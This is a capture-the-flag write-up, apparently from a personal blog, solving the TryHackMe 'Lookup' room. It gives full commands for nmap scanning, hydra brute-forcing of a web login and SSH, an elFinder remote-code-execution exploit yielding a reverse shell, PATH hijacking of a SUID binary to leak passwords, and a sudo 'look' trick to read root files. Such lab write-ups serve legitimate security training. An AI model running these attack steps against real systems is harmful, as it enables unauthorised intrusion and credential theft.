---
title: Lookup - TryHackMe
date: 2025-03-04
---

<script setup>
    import RoomCard from "../../../.vitepress/components/thm/RoomCard.vue";
</script>

<RoomCard
    roomName="Lookup"
    roomIcon="/ctf/tryhackme/lookup/icon-room.png"
    roomLink="https://tryhackme.com/room/lookup"
    roomLevel="EASY"
    roomTechnology="Linux"
/>

## Challenge description

Lookup offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various
real-world vulnerabilities, ranging from web application weaknesses to privilege escalation techniques. By exploring and
exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical hacking.
Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and
subdomains. They will learn how to exploit web application vulnerabilities, such as command injection, and understand
the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the
power of scripting in penetration testing.

# Challenge Overview

In this challenge, we are tasked with gaining access to a vulnerable web application, escalating our privileges, and
ultimately retrieving the root flag. The target system hosts a login page and a file management system, which we will
enumerate and exploit to achieve our objective.

## Enumeration

### Nmap Scan

To begin, we perform a comprehensive scan of the target machine to identify open ports and services:

```bash
nmap -sC -sV -v -p- -oN lookup.nmap 10.10.223.218
```

#### Scan Results:

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 445f26674b4a919b597a9559c84c2e04 (RSA)
|   256 0a4bb9b177d24879fc2f8a3d643aad94 (ECDSA)
|_  256 d33b97ea54bc414d0339f68fadb6a0fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://lookup.thm
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan reveals two open ports:

- **22/tcp**: SSH service running OpenSSH 8.2p1
- **80/tcp**: HTTP service running Apache httpd 2.4.41

## Web Enumeration

### Accessing the Web Application

Navigating to the target machine’s IP address redirects us to `http://lookup.thm`. To access this domain, we add it to
our `/etc/hosts` file:

```bash
echo "10.10.223.218 lookup.thm" | sudo tee -a /etc/hosts
```

Upon visiting `http://lookup.thm`, we find a login page:

![Lookup Login Page](/ctf/tryhackme/lookup/login-page.png)

## Credential Brute-Force Attack

### Username Enumeration

Testing with `admin:admin` returns an error message indicating an incorrect password, which suggests that the username
`admin` exists. This allows us to perform a brute-force attack.

```bash
hydra -l admin -P /usr/share/wordlists/seclists/Passwords/2020-200_most_used_passwords.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password."
```

#### Output:

```bash
[80][http-post-form] host: lookup.thm   login: admin   password: redacted
```

Although we find a valid password, logging in still fails. We pivot to brute-forcing usernames using `redacted`.

```bash
hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p redacted lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong"
```

#### Output:

```bash
[80][http-post-form] host: lookup.thm   login: jose   password: redacted
```

Now, logging in as `jose` grants access to the application.

## File Management System Exploitation

Upon login, we are redirected to `http://files.lookup.thm/`. After adding it to `/etc/hosts`, we gain access to the file
manager system called `Elfinder`.

![Elfinder](/ctf/tryhackme/lookup/files-page.png)

Checking for vulnerabilities, we find **CVE-2019-9194**, which allows an attacker to upload a malicious PHP payload for
remote code execution.

### Exploiting Elfinder

We found the exploit script on [GitHub](https://github.com/hadrian3689/elFinder_2.1.47_php_connector_rce).

```bash
python3 exploit.py -t 'http://files.lookup.thm/elFinder/' -lh 127.0.0.1 -lp 4444
```

We successfully obtain a reverse shell as `www-data`:

```bash
www-data@lookup:/var/www/files.lookup.thm/public_html/elFinder/php$ whoami
www-data
```

## Privilege Escalation

### Finding Credentials

Listing `/home`, we find a user `think`. Searching for files with the SUID bit set:

```bash
find / -type f -perm -u=s 2>/dev/null
```

We identify `/usr/sbin/pwm` as a potential target.

### Exploiting `pwm`

Running it returns:

```bash
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

We can hijack the `id` command by modifying the `$PATH` variable:

```bash
echo "echo 'uid=1001(think) gid=1001(think) groups=1001(think)'" > /tmp/id
chmod +x /tmp/id
export PATH=/tmp:$PATH
```

Running `pwm` again now leaks the passwords:

```bash
jose1006
jose1004
josemario.AKA(think)
```

Using `hydra` to brute-force SSH with the leaked passwords:

```bash
hydra -l think -P passwords.txt 10.10.16.248 ssh
```

We successfully log in using `think:redacted`.

```bash
ssh think@10.10.16.248
think@lookup:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)
```

Now, we can read the user flag:

```bash
cat user.txt
THM{USER_FLAG}
```

### Root Privilege Escalation

Checking `sudo` permissions:

```bash
sudo -l
```

```
User think may run the following commands on lookup:
    (ALL) /usr/bin/look
```

Using `GTFOBins`, we find that `look` can read arbitrary files as root:

```bash
LFILE=/root/root.txt
sudo look '' "$LFILE"
```

This successfully retrieves the root flag:

```bash
THM{ROOT_FLAG}
```